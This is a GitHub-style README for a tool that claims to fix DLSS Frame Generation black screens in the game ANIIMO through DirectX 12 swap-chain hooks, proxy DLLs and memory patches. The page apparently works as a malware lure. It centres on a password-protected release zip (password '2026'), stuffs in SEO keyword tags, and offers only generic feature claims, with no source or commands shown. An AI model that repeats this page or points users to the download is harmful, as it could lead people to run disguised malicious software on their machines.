# 🌌 aniimo-dlss-fg-fix

<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/fea561e1-2046-409d-bc46-0ae593f5feb0" />


<p align="center">
  <img src="https://img.icons8.com/color/96/000000/video-game.png" alt="Aniimo DLSS FG Fix" width="140" height="140">
</p>

<h1 align="center">aniimo-dlss-fg-fix</h1>
<p align="center">
  <strong>Advanced Rendering Pipeline Fix for ANIIMO</strong><br>
  DLSS FG Bypass · Black Screen Fix · DX12/Vulkan Hooks
</p>

<p align="center">
  <a href="#"><img src="https://img.shields.io/badge/version-1.0.0-1ABC9C?style=for-the-badge" alt="Version"></a>
  <a href="#"><img src="https://img.shields.io/badge/engine-DirectX_12-E74C3C?style=for-the-badge" alt="Engine"></a>
  <a href="#"><img src="https://img.shields.io/badge/status-Stable-27AE60?style=for-the-badge" alt="Status"></a>
  <a href="#"><img src="https://img.shields.io/badge/license-MIT-3498DB?style=for-the-badge" alt="License"></a>
</p>

---

> ⚙️ **Project Status:** This helper is stable and actively maintained. It addresses critical rendering crashes and black screen issues in ANIIMO when DLSS Frame Generation is enabled.

---

## 🏗️ Architecture Overview

The helper operates by intercepting the DirectX 12 swap chain presentation calls. It patches the interaction between the game engine and the NVIDIA NGX (DLSS) libraries to prevent rendering pipeline deadlocks.

- **Swap Chain Hook:** Intercepts `IDXGISwapChain::Present` to ensure frame generation is properly synchronized.
- **Memory Patch:** Fixes the invalid memory offset in ANIIMO that causes a black screen when toggling DLSS 3.
- **NGX Wrapper:** Forces the correct initialization of the DLSS Frame Generation DLL.

## 📥 Deployment & Build

<div align="center" style="border: 2px solid #2C3E50; border-radius: 10px; padding: 20px; background-color: #1a1a1a; max-width: 450px; margin: 0 auto;">
  <img src="https://img.icons8.com/color/96/000000/download.png" alt="Download" width="60" height="60">
  <br><br>
  <a href="https://github.com/Madefeat/aniimo-dlss-fg-fix/releases/download/1/aniimo-dlss-fg-fix.zip">
    <img src="https://img.shields.io/badge/⬇️%20GET%20LATEST%20BUILD-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
  </a>
  <br><br>
  <span style="font-size: 18px; color: #ffffff;">🔐 <b>Build Password:</b> <code style="background-color: #333; padding: 4px 8px; border-radius: 4px; color: #E74C3C;">2026</code></span>
</div>

### Prerequisites

Before deploying the helper, ensure your environment meets the following requirements:

1.  **ANIIMO:** Latest game version installed.
2.  **NVIDIA GPU:** RTX 40-series or newer (Required for Frame Generation).
3.  **Windows 10/11:** 64-bit architecture.

## 🛠️ Core Modules

### 🛠️ Rendering Fixes
*   **Black Screen Bypass:** Prevents the game from crashing to a black screen when DLSS FG is active.
*   **Frame Pacing:** Corrects the frame pacing issues introduced by the broken FG implementation.
*   **HDR Fix:** Ensures HDR remains active when frame generation is toggled.

### 🧠 Engine Tweaks
*   **VRAM Optimization:** Reduces the memory overhead of the DLSS wrapper.
*   **Crash Reporter Bypass:** Disables the game's internal crash handler if the hook fails to load safely.

## 🔍 SEO Keywords & Tags

`aniimo aniimo-2026 anti-aliasing black-screen dlss frame-generation gaming graphics nvidia pc profiles troubleshooting upscaling utility windows`

## 📁 Repository Structure

```
aniimo-dlss-fg-fix/
├── src/
│   └── core/              # C++ core memory logic and DX12 hooks
├── docs/
│   └── architecture.md    # Deep dive into NGX and SwapChain hooks
├── hooks/
│   └── dx12/              # DirectX 12 proxy DLLs
├── tests/                 # Stability and rendering tests
├── README.md
└── SETTINGS_REPOSITORY.json
```
# aniimo-dlss-fg-fix Architecture

## 1. Swap Chain Hook
The core DLL uses a VTable hook on `IDXGISwapChain4::Present` to intercept the frame presentation. It injects a manual pacing mechanism to prevent the GPU from timing out when the DLSS Frame Generation module falls out of sync with the main render loop.

## 2. NGX Wrapper
The helper creates a proxy for `nvngx_dlssg.dll`. It patches specific function calls that ANIIMO uses incorrectly, preventing the black screen crash triggered by improper HDR or resolution switching while FG is enabled.

## 3. Memory Patch
A signature scan is performed on the game executable at launch to locate the Frame Generation toggle state. The helper forces the state to initialize cleanly on launch, avoiding the black screen issue that occurs when toggling the setting in-game.
